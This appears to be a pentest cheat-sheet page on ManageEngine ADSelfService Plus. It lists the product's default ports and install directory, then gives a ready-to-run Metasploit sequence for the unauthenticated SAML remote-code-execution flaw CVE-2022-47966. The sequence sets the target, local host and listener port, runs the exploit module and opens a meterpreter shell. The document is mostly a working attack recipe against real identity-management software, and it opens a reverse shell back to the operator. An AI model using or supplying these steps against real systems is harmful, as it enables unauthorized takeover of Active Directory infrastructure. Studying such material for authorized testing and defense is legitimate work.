# ManageEngine ADSelfService Plus PrivEsc

ADSelfService Plus is an integrated Active Directory Self-Service Password Management and Single Sign-on Solution that reduces password-related help desk calls. Default ports are 8888 (http) and 9251 (https).

### Directories <a href="#directories" id="directories"></a>

```
dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\
```

### Unauthenticated SAML RCE (CVE-2022-47966) <a href="#unauthenticated-saml-rce-cve-2022-47966" id="unauthenticated-saml-rce-cve-2022-47966"></a>

Reference: [https://www.rapid7.com/db/modules/exploit/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966/](https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/)

```
msfconsole
msf> use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
msf> set GUID 43ae36f51da65753530a64b37a510a53
msf> set ISSUER_URL http://example.com/adfs/services/trust
msf> set RHOSTS <target-ip>
msf> set RPORT 9251
msf> set LHOST <local-ip>
msf> set LPORT 4444
msf> run
meterpreter> shell
```
